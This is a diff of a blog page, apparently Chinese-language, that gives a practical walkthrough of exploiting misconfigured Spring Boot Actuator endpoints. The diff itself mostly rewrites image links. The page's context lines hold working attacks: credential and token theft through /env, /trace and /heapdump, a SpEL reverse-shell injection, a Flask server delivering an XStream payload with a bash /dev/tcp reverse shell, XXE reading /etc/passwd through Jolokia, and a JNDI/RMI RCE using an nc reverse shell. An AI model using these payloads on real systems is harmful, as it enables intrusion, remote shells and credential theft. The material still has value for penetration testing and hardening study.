@@ -257,7 +257,7 @@
 
 	<a href="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/" itemprop="url">
 		<time datetime="2021-10-22T10:23:46.643Z" itemprop="dateUpdated">
-	  		2021-10-25
+	  		2021-11-03
 	  </time>
 	</a> 
 
@@ -277,7 +277,7 @@
 		<div class="article-content" id="article-content">
 			<h1 id="Spring-Boot-集合"><a href="#Spring-Boot-集合" class="headerlink" title="Spring Boot 集合"></a><strong>Spring Boot 集合</strong></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>Actuator是spring boot提供的用来对应用系统进行自省和监控的功能模块，借助于Actuator开发者可以很方便地对应用系统某些监控指标进行查看、统计等。如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。Actuator配置不当会导致未授权访问获取网站相关配置甚至RCE</p>
 <h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合</p>
-<h3 id="组件版本相互依赖关系"><a href="#组件版本相互依赖关系" class="headerlink" title="组件版本相互依赖关系"></a>组件版本相互依赖关系</h3><p>![image-20210825221013561](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210825221013561.png)</p>
+<h3 id="组件版本相互依赖关系"><a href="#组件版本相互依赖关系" class="headerlink" title="组件版本相互依赖关系"></a>组件版本相互依赖关系</h3><p>![image-20210825221013561](Spring Boot Actuator未授权访问利用实战利用/image-20210825221013561.png)</p>
 <h3 id="Spring-Cloud-与-Spring-Boot-版本之间的依赖关系"><a href="#Spring-Cloud-与-Spring-Boot-版本之间的依赖关系" class="headerlink" title="Spring Cloud 与 Spring Boot 版本之间的依赖关系"></a>Spring Cloud 与 Spring Boot 版本之间的依赖关系</h3><p>![image-20210825221109141](Spring Boot Actuator未授权访问利用实战利用/image-20210825221109141.png)</p>
 <h3 id="Spring-Cloud-小版本号的后缀及含义"><a href="#Spring-Cloud-小版本号的后缀及含义" class="headerlink" title="Spring Cloud 小版本号的后缀及含义"></a>Spring Cloud 小版本号的后缀及含义</h3><p>![image-20210825221154274](Spring Boot Actuator未授权访问利用实战利用/image-20210825221154274.png)</p>
 <p>[TOC]</p>
@@ -305,15 +305,15 @@
 <p>启动服务(安装完成后会在主目录下生成后target文件夹，执行里面的jar包启动服务)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ./target/xxxxxxxx.jar</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/a149799f8e8cf1d346efe3ee5649f3d1.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/a149799f8e8cf1d346efe3ee5649f3d1.png)</p>
 <p>访问http:<em>//127.0.0.1:8090显示springboot欢迎页面</em></p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/733cfef5eb93509eee7b349f83def144.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/733cfef5eb93509eee7b349f83def144.png)</p>
 <p>当访问错误页面时，会提示错误信息</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/b84c0336ffa31a1c60da33c76f379659.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/b84c0336ffa31a1c60da33c76f379659.png)</p>
 <p>这里访问env就可以看到环境特性</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/0b00e02831d25ebd363910e0a85f6c16.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/0b00e02831d25ebd363910e0a85f6c16.png)</p>
 <p>访问health显示应用的健康状态</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/e506922f3ff848db66817588eb0afe41.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/e506922f3ff848db66817588eb0afe41.png)</p>
 <h2 id="漏洞集合"><a href="#漏洞集合" class="headerlink" title="漏洞集合"></a>漏洞集合</h2><h3 id="1-信息泄露"><a href="#1-信息泄露" class="headerlink" title="1.信息泄露"></a>1.信息泄露</h3><h4 id="1-1-路由及接口调用详情泄露"><a href="#1-1-路由及接口调用详情泄露" class="headerlink" title="1.1.路由及接口调用详情泄露"></a>1.1.路由及接口调用详情泄露</h4><blockquote>
 <p>开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等</p>
 </blockquote>
@@ -326,7 +326,7 @@
 <p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞</p>
 <p><strong>还有一些内置的端点路由由于未设置actuator访问控制暴露</strong></p>
 <p>所有端点皆可以在org.springframework.boot.actuate.endpoint中找到表达的含义</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/33a5ec86aaddffe377ab51095d2b50db.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/33a5ec86aaddffe377ab51095d2b50db.png)</p>
 <blockquote>
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注：Spring1.x在url跟路径下进行注册，在2.x版本中移动到/actuator的路径下：</span><br><span class="line"></span><br><span class="line">Spring1.x与2.x在post请求方面也存在差异，</span><br><span class="line"></span><br><span class="line">1.x通过application/x-www-form-urlencoded 进行post请求，</span><br><span class="line"></span><br><span class="line">2.x通过传递json包请求的applistion/json</span><br></pre></td></tr></table></figure>
 </blockquote>
@@ -361,16 +361,16 @@
 <p>这个主要通过访问/trace 路径获取用户认证字段信息，比如如下站点存在 actuator<br>配置不当漏洞，在其 trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP<br>头等），还有用户 token、cookie字段</p>
 </blockquote>
 <p>trace 路径：</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/d50c0dccc7f6b5f4a461764a2f7065b4.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/d50c0dccc7f6b5f4a461764a2f7065b4.png)</p>
 <p>用户字段泄露:</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/561692caae82f0847bc116f9873e09d1.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/561692caae82f0847bc116f9873e09d1.png)</p>
 <p>通过替换 token 字段可获取其他用户的信息</p>
 <p><strong>数据库账户密码泄露</strong></p>
 <p>由于 actuator 会监控站点 mysql、mangodb<br>之类的数据库服务，所以通过监控信息有时可以拿下 mysql、mangodb<br>数据库；这个主要通过/env 路径获取这些服务的配置信息，比如如下站点存在 actuator<br>配置不当漏洞，通过其/env 路径，可获得 mysql、mangodb 的用户名及密码：</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/db9fb7d5cba6a62bd56ea1cf07835469.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/db9fb7d5cba6a62bd56ea1cf07835469.png)</p>
 <p><strong>Gitlab源代码泄露</strong></p>
 <p>这个一般是在/health 路径，比如如下站点，访问其 health 路径可探测到站点 git<br>项目地址：</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/813b4e89bbaa2442f21e889e89be4d9c.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/813b4e89bbaa2442f21e889e89be4d9c.png)</p>
 <p><strong>后台用户账号密码泄露</strong></p>
 <p>这个一般是在/heapdump 路径下，访问/heapdump 路径，返回 GZip 压缩 hprof<br>堆转储文件。在 Android studio<br>打开，会泄露站点内存信息，很多时候会包含后台用户的账号密码，泄露账号密码</p>
 <h4 id="1-3获取星号脱敏的密码明文"><a href="#1-3获取星号脱敏的密码明文" class="headerlink" title="1.3获取星号脱敏的密码明文"></a>1.3获取星号脱敏的密码明文</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><blockquote>
@@ -513,7 +513,7 @@
 <p>在搭建过程中可能会出现启动jar包时提示没有主清单属性，需要在pom.xml文件中添加依赖完成(参照文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44373935/article/details/90046451">点击这里</a>)</p>
 <p>访问<a target="_blank" rel="noopener" href="https://127.0.0.1:9091/article?id=$%7B7*7%7D">https://127.0.0.1:9091/article?id=${7*7}</a></p>
 <p>可以看到错误页面中花括号里面的表达式已经计算出来啦，49。此处参数点可利用</p>
-<p>![image-20210827133545079](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210827133545079.png)</p>
+<p>![image-20210827133545079](Spring Boot Actuator未授权访问利用实战利用/image-20210827133545079.png)</p>
 <p>下面将花括号里面的修改成需要执行的命令</p>
 <p>首先要将命令字符串转换为java字节形式，利用上面的python脚本</p>
 <p>这里执行的命令为bash反弹shell，先将其进行base64编码转换(<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">在线转换地址</a>)</p>
@@ -522,7 +522,7 @@
 
 
 <p>在将其转换为java字节</p>
-<p>![image-20210827151659784](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210827151659784.png)</p>
+<p>![image-20210827151659784](Spring Boot Actuator未授权访问利用实战利用/image-20210827151659784.png)</p>
 <p>使用nc监听192.168.233.243的9090端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9090</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -625,7 +625,7 @@
 <blockquote>
 <p>  Eureka-Client&lt;1.8.7，eureka服务多用于netflix组件中，可通过在&lt;<br>  span=””&gt;/env中搜寻Netflix关键字判断时候可能存在Eureka服务</p>
 </blockquote>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/7af2a3cf6a49f6b649e1aacbeb4aacf7.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/7af2a3cf6a49f6b649e1aacbeb4aacf7.png)</p>
 <p>Eureka服务属性被设置为恶意的外部Eureka server<br>URL地址时，通过/refresh会触发目标机器请求远程URL,Eureka server<br>URL可通过在/env处POST数据进行更改</p>
 <h5 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一:  架设响应Xstream payload的网站</strong></p>
 <p>提供一个依赖 Flask 并符合要求的 <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p>
@@ -658,17 +658,17 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python# coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span>)@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span>    </span><br><span class="line">xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;  &lt;jdk.nashorn.internal.objects.NativeString&gt;    </span></span><br><span class="line"><span class="string">&lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;      &lt;dataHandler&gt;        </span></span><br><span class="line"><span class="string">&lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;          </span></span><br><span class="line"><span class="string">&lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;            </span></span><br><span class="line"><span class="string">&lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;                    </span></span><br><span class="line"><span class="string">&lt;command&gt;                       </span></span><br><span class="line"><span class="string">&lt;string&gt;/bin/bash&lt;/string&gt;                       </span></span><br><span class="line"><span class="string">&lt;string&gt;-c&lt;/string&gt;                      </span></span><br><span class="line"><span class="string">&lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/192.168.233.247/1234 0&gt;&amp;amp;1&lt;/string&gt;                    </span></span><br><span class="line"><span class="string">&lt;/command&gt;                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;                  &lt;/next&gt;                </span></span><br><span class="line"><span class="string">&lt;/iter&gt;                </span></span><br><span class="line"><span class="string">&lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;                  &lt;method&gt;                    </span></span><br><span class="line"><span class="string">&lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;                    &lt;name&gt;start&lt;/name&gt;                    </span></span><br><span class="line"><span class="string">&lt;parameter-types/&gt;                 </span></span><br><span class="line"><span class="string"> &lt;/method&gt;                  </span></span><br><span class="line"><span class="string">&lt;name&gt;foo&lt;/name&gt;                </span></span><br><span class="line"><span class="string">&lt;/filter&gt;                </span></span><br><span class="line"><span class="string">&lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;             </span></span><br><span class="line"><span class="string"> &lt;/serviceIterator&gt;              </span></span><br><span class="line"><span class="string">&lt;lock/&gt;            </span></span><br><span class="line"><span class="string">&lt;/cipher&gt;            </span></span><br><span class="line"><span class="string">&lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;            &lt;ibuffer&gt;&lt;/ibuffer&gt;          </span></span><br><span class="line"><span class="string">&lt;/is&gt;        </span></span><br><span class="line"><span class="string">&lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">&lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">&lt;/value&gt;</span></span><br><span class="line"><span class="string">&lt;/jdk.nashorn.internal.objects.NativeString&gt;&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span>    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>Python3启动web,如下:</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/7622e80d3286c478d7fdf42a216d67d4.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/7622e80d3286c478d7fdf42a216d67d4.png)</p>
 <p>使用Burp构造请求报文发送POST请求</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eureka.client.serviceUrl.defaultZone=http://192.168.233.249/xstream</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/85864c908118a436d542c5dfc3fedba5.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/85864c908118a436d542c5dfc3fedba5.png)</p>
 <p>刷新配置</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/e061acae7d5aaf5dd9e36a188a0c7375.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/e061acae7d5aaf5dd9e36a188a0c7375.png)</p>
 <p>kali开启监听端口1234获取反弹shell</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/c2aacb012495255a8681c062a427bc34.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/c2aacb012495255a8681c062a427bc34.png)</p>
 <p>注：该漏洞的成功利用与jdk版本有关，此处用的是1.8.0_161</p>
 <h5 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h5><ol>
 <li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li>
@@ -728,11 +728,11 @@
 
 
 <h5 id="利用实例-3"><a href="#利用实例-3" class="headerlink" title="利用实例"></a>利用实例</h5><p>判断是否存在jolokia插件访问<a href="http://ip:port/jolokia/list">http://ip:port/jolokia/list</a> 是否存在</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/4406018ebff3c7de7dd29c07d7e0ccc7.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/4406018ebff3c7de7dd29c07d7e0ccc7.png)</p>
 <p>在/jolokia/list 接口搜索关键字：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ch.qos.logback.classic.jmx.JMXConfigurator和reloadByURL</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/9fc925bb48d7fbc26191d101b9a9adab.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/9fc925bb48d7fbc26191d101b9a9adab.png)</p>
 <p><strong>读取敏感文件</strong></p>
 <p>创建xml文档logback.xml</p>
 <p>请求访问fileread.dtd文件，192.168.233.1为服务器ip</p>
@@ -740,18 +740,18 @@
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?\&gt;</span><br><span class="line"></span><br><span class="line"> \&lt;!DOCTYPE a [ \&lt;!ENTITY % remote SYSTEM</span><br><span class="line"></span><br><span class="line">  &quot;http://192.168.233.1/filereaed.dtd&quot;\&gt;%remote;%int;]\&gt;</span><br><span class="line"></span><br><span class="line">\&lt;a\&gt;&amp;trick;\&lt;/a\&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
 <p>将该xml放到服务器上，用于访问获取</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/2c2311a2d34ee6ff782221a35d920431.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/2c2311a2d34ee6ff782221a35d920431.png)</p>
 <p>创建文件fileread.dtd，读取/etc/passwd文件</p>
 <blockquote>
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#x27;:%d;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/f2d4373437722b5f3d7ac97085b66953.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/f2d4373437722b5f3d7ac97085b66953.png)</p>
 <p>在外部构造url访问，Payload如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.233.247:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/192.168.233.1!/logback.xml</span><br></pre></td></tr></table></figure>
 
 <p>可以看到返回的信息中存在etc/passwd的用户信息</p>
 <p>如红框中所示</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/66e6d7ece8ce1dbfd308720f8cbbb751.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/66e6d7ece8ce1dbfd308720f8cbbb751.png)</p>
 <p><strong>远程代码执行</strong></p>
 <p>可以在logback.xml中使用insertFromJNDI标签，这个标签允许我们从 JNDI<br>加载变量，导致了rce漏洞产生。<br>rce的流程主要分为4步。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.  构造 Get 请求访问目标，使其去外部服务器加载恶意 logback.xml 文件。</span><br><span class="line"></span><br><span class="line">2.  解析 logback.xml 时，最终会触发 InitialContext.lookup(URI) 操作，而URI</span><br><span class="line">    为恶意 RMI 服务地址。</span><br><span class="line"></span><br><span class="line">3.  恶意 RMI 服务器向目标返回一个 Reference 对象，Reference</span><br><span class="line">    对象中指定了目标本地存在的 BeanFactory 类，以及Bean Class</span><br><span class="line">    的类名、属性、属性值（这里为 ELProcessor 、x、eval(...))。</span><br><span class="line"></span><br><span class="line">4.  目标在进行 lookup() 操作时，会动态加载并实例化 BeanFactory 类，接着调用</span><br><span class="line">    factory.getObjectInstance() 方法，通过反射的方式实例化 Reference</span><br><span class="line">    所指向的任意 Bean Class，并且会调用 setter</span><br><span class="line">    方法为所有的属性赋值。对应我们的代码，最终调用 setter</span><br><span class="line">    方法的时候，就是执行如下代码：</span><br><span class="line"></span><br><span class="line">ELProcessor.eval(\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc evil-server-ip port &gt;/tmp/f&#x27;]).start()\&quot;</span><br></pre></td></tr></table></figure>
@@ -768,13 +768,13 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令:mvn clean install</span><br></pre></td></tr></table></figure>
 
 <p>打包成功</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/d4957a0c50e626f62d06f5fc2853ddbb.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/d4957a0c50e626f62d06f5fc2853ddbb.png)</p>
 <p>将上面打包的jar放到kali上，开启8090端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如下命令:java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/d1dffff25909ba0840e280f858d32e0d.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/d1dffff25909ba0840e280f858d32e0d.png)</p>
 <p>使用nc开启监听1234端口</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/b531b990d627d9069028dcea04343c27.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/b531b990d627d9069028dcea04343c27.png)</p>
 <p>下面为在服务器上放置的logback.xml用来请求kaLi开启的8090端口建立连接</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line"></span><br><span class="line">&lt;insertFromJNDI env-entry-name=&quot;rmi://192.168.233.249:8090/jndi&quot; as=&quot;appName&quot;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
 
@@ -786,9 +786,9 @@
 
 
 <p>浏览器返回结果如下:</p>
